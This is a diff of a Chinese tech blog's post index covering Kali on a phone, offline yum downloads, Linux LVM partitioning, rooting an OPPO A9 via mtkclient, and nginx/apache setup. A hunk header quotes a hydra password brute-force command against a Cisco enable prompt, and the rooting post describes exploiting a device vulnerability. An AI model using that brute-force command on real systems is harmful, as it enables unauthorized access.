-<p>选择保存位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yumdownloader --destdir=/root wget</span><br></pre></td></tr></table></figure>
-
-<p>该命令网上说也能下载，查了下说是本机如果安装了该软件则不会下载<br>yum install –downloadonly –downloaddir&#x3D;&#x2F;root wget</p>
+    <title>kali移动端（root安装，不改内核）</title>
+    <url>/2024/10/15/kali/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
+<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
+<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
+<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>点击移动端，mobile</p>
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
+<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
 ]]></content>
       <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-        <category>命令</category>
+        <category>手机搞机</category>
       </categories>
       <tags>
-        <tag>linux命令</tag>
+        <tag>kali</tag>
+        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -1995,51 +1975,23 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>linux硬盘分区挂载和扩容</title>
-    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
-    <content><![CDATA[<h2 id="分区和挂载"><a href="#分区和挂载" class="headerlink" title="分区和挂载"></a>分区和挂载</h2><h3 id="非逻辑分区和挂载"><a href="#非逻辑分区和挂载" class="headerlink" title="非逻辑分区和挂载"></a>非逻辑分区和挂载</h3><h4 id="先将空闲磁盘通过fdisk分区"><a href="#先将空闲磁盘通过fdisk分区" class="headerlink" title="先将空闲磁盘通过fdisk分区"></a>先将空闲磁盘通过fdisk分区</h4><p>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>
+    <title>linux下载离线安装包</title>
+    <url>/2025/01/13/linux%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
+    <content><![CDATA[<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><p>以wget为例，需要先下载yum-utils，再下载安装包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install yum-utils</span><br><span class="line">yumdownloader wget</span><br></pre></td></tr></table></figure>
 
-<p>帮助</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
+<p>选择保存位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yumdownloader --destdir=/root wget</span><br></pre></td></tr></table></figure>
 
-<h4 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>
-
-<h3 id="逻辑卷及挂载"><a href="#逻辑卷及挂载" class="headerlink" title="逻辑卷及挂载"></a>逻辑卷及挂载</h3><p>首先和上步一样，使用fdisk创建一个分区&#x2F;dev&#x2F;sdb1</p>
-<h4 id="创建物理卷（PV）"><a href="#创建物理卷（PV）" class="headerlink" title="创建物理卷（PV）"></a>创建物理卷（PV）</h4><p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate &#x2F;dev&#x2F;sdb{1,2,3,4,5}</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>
-
-<h4 id="创建卷组（VG）"><a href="#创建卷组（VG）" class="headerlink" title="创建卷组（VG）"></a>创建卷组（VG）</h4><p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>
-
-<h4 id="创建逻辑卷（LV）"><a href="#创建逻辑卷（LV）" class="headerlink" title="创建逻辑卷（LV）"></a>创建逻辑卷（LV）</h4><p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
-
-<h4 id="挂载-1"><a href="#挂载-1" class="headerlink" title="挂载"></a>挂载</h4><p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
-
-<h2 id="分区扩容"><a href="#分区扩容" class="headerlink" title="分区扩容"></a>分区扩容</h2><h3 id="非逻辑分区"><a href="#非逻辑分区" class="headerlink" title="非逻辑分区"></a>非逻辑分区</h3><p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
-<h4 id="已分区扩容"><a href="#已分区扩容" class="headerlink" title="已分区扩容"></a>已分区扩容</h4><p>以&#x2F;dev&#x2F;sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
-
-<h4 id="未分区扩容"><a href="#未分区扩容" class="headerlink" title="未分区扩容"></a>未分区扩容</h4><p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>
-
-<h3 id="逻辑分区"><a href="#逻辑分区" class="headerlink" title="逻辑分区"></a>逻辑分区</h3><p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
-<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
-<h2 id="删除分区操作"><a href="#删除分区操作" class="headerlink" title="删除分区操作"></a>删除分区操作</h2><p>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
-
-<h2 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h2><p>通过df -h查看文件系统名称，然后修改&#x2F;etc&#x2F;fstab最后一行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
+<p>该命令网上说也能下载，查了下说是本机如果安装了该软件则不会下载<br>yum install –downloadonly –downloaddir&#x3D;&#x2F;root wget</p>
+]]></content>
       <categories>
         <category>系统运维</category>
         <category>linux</category>
+        <category>命令</category>
       </categories>
       <tags>
-        <tag>硬盘分区</tag>
-        <tag>分区扩容</tag>
+        <tag>linux命令</tag>
       </tags>
   </entry>
   <entry>
@@ -2250,22 +2202,112 @@ run
       </tags>
   </entry>
   <entry>
-    <title>oppoA9 mtk手机root</title>
-    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
-    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
-<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
-<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
-</code></pre>
-<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
-<p><img src="/images/pasted-2.png" alt="upload successful"></p>
-<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
-<p><img src="/images/pasted-3.png" alt="upload successful"></p>
-]]></content>
+    <title>linux硬盘分区挂载和扩容</title>
+    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
+    <content><![CDATA[<h2 id="分区和挂载"><a href="#分区和挂载" class="headerlink" title="分区和挂载"></a>分区和挂载</h2><h3 id="非逻辑分区和挂载"><a href="#非逻辑分区和挂载" class="headerlink" title="非逻辑分区和挂载"></a>非逻辑分区和挂载</h3><h4 id="先将空闲磁盘通过fdisk分区"><a href="#先将空闲磁盘通过fdisk分区" class="headerlink" title="先将空闲磁盘通过fdisk分区"></a>先将空闲磁盘通过fdisk分区</h4><p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>
+
+<p>帮助</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
+
+<h4 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>
+
+<h3 id="逻辑卷及挂载"><a href="#逻辑卷及挂载" class="headerlink" title="逻辑卷及挂载"></a>逻辑卷及挂载</h3><p>首先和上步一样，使用fdisk创建一个分区&#x2F;dev&#x2F;sdb1</p>
+<h4 id="创建物理卷（PV）"><a href="#创建物理卷（PV）" class="headerlink" title="创建物理卷（PV）"></a>创建物理卷（PV）</h4><p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate &#x2F;dev&#x2F;sdb{1,2,3,4,5}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建卷组（VG）"><a href="#创建卷组（VG）" class="headerlink" title="创建卷组（VG）"></a>创建卷组（VG）</h4><p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建逻辑卷（LV）"><a href="#创建逻辑卷（LV）" class="headerlink" title="创建逻辑卷（LV）"></a>创建逻辑卷（LV）</h4><p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
+
+<h4 id="挂载-1"><a href="#挂载-1" class="headerlink" title="挂载"></a>挂载</h4><p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
+
+<h2 id="分区扩容"><a href="#分区扩容" class="headerlink" title="分区扩容"></a>分区扩容</h2><h3 id="非逻辑分区"><a href="#非逻辑分区" class="headerlink" title="非逻辑分区"></a>非逻辑分区</h3><p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
+<h4 id="已分区扩容"><a href="#已分区扩容" class="headerlink" title="已分区扩容"></a>已分区扩容</h4><p>以&#x2F;dev&#x2F;sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
+
+<h4 id="未分区扩容"><a href="#未分区扩容" class="headerlink" title="未分区扩容"></a>未分区扩容</h4><p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>
+
+<h3 id="逻辑分区"><a href="#逻辑分区" class="headerlink" title="逻辑分区"></a>逻辑分区</h3><p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
+<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
+<h2 id="删除分区操作"><a href="#删除分区操作" class="headerlink" title="删除分区操作"></a>删除分区操作</h2><p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
+
+<h2 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h2><p>通过df -h查看文件系统名称，然后修改&#x2F;etc&#x2F;fstab最后一行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>手机搞机</category>
+        <category>系统运维</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>手机root</tag>
+        <tag>硬盘分区</tag>
+        <tag>分区扩容</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nginx和apache-简单配置</title>
+    <url>/2025/06/23/nginx%E5%92%8Capache/</url>
+    <content><![CDATA[<h2 id="Apache-配置"><a href="#Apache-配置" class="headerlink" title="Apache 配置"></a>Apache 配置</h2><blockquote>
+<p>一般配置文件位置：</p>
+<ul>
+<li>Debian&#x2F;Ubuntu: <code>/etc/apache2/sites-available/000-default.conf</code></li>
+<li>CentOS&#x2F;RHEL: <code>/etc/httpd/conf.d/</code></li>
+</ul>
+<p>启动&#x2F;重启命令：</p>
+<ul>
+<li>Debian&#x2F;Ubuntu: <code>sudo systemctl restart apache2</code></li>
+<li>CentOS&#x2F;RHEL: <code>sudo systemctl restart httpd</code></li>
+</ul>
+</blockquote>
+<h3 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www.example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory /var/www/html&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<ul>
+<li><code>ServerName</code>：指定主机名。</li>
+<li><code>DocumentRoot</code>：指定网站根目录。</li>
+<li><code>&lt;Directory&gt;</code>：设置对该目录的访问规则。</li>
+</ul>
+<hr>
+<h2 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h2><blockquote>
+<p>配置文件位置：</p>
+<ul>
+<li>Debian&#x2F;Ubuntu: <code>/etc/nginx/sites-available/default</code></li>
+<li>CentOS&#x2F;RHEL: <code>/etc/nginx/nginx.conf</code></li>
+</ul>
+<p>启动&#x2F;重启命令：</p>
+<ul>
+<li>Debian&#x2F;Ubuntu&#x2F;CentOS&#x2F;RHEL 通用：<code>sudo systemctl restart nginx</code></li>
+</ul>
+</blockquote>
+<h3 id="示例配置-1"><a href="#示例配置-1" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html index.php;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<ul>
+<li><code>listen 80</code>：监听80端口。</li>
+<li><code>server_name</code>：指定主机名。</li>
+<li><code>root</code>：指定网站根目录。</li>
+<li><code>try_files</code>：检查请求是否为实际存在的文件，否则显示404。</li>
+</ul>
+<h3 id="仅允许域名访问"><a href="#仅允许域名访问" class="headerlink" title="仅允许域名访问"></a>仅允许域名访问</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先处理非法 Host</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许指定的域名</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<ol>
+<li>第一个 server_name _ 区块匹配所有没有匹配到指定 server_name 的请求，直接 404。</li>
+<li>第二个只允许 <a href="http://www.example.com./">www.example.com。</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>基础学习篇</category>
+      </categories>
+      <tags>
+        <tag>apache</tag>
+        <tag>nginx</tag>
       </tags>
   </entry>
   <entry>
@@ -2391,64 +2433,22 @@ run
       </tags>
   </entry>
   <entry>
-    <title>nginx和apache-简单配置</title>
-    <url>/2025/06/23/nginx%E5%92%8Capache/</url>
-    <content><![CDATA[<h2 id="Apache-配置"><a href="#Apache-配置" class="headerlink" title="Apache 配置"></a>Apache 配置</h2><blockquote>
-<p>一般配置文件位置：</p>
-<ul>
-<li>Debian&#x2F;Ubuntu: <code>/etc/apache2/sites-available/000-default.conf</code></li>
-<li>CentOS&#x2F;RHEL: <code>/etc/httpd/conf.d/</code></li>
-</ul>
-<p>启动&#x2F;重启命令：</p>
-<ul>
-<li>Debian&#x2F;Ubuntu: <code>sudo systemctl restart apache2</code></li>
-<li>CentOS&#x2F;RHEL: <code>sudo systemctl restart httpd</code></li>
-</ul>
-</blockquote>
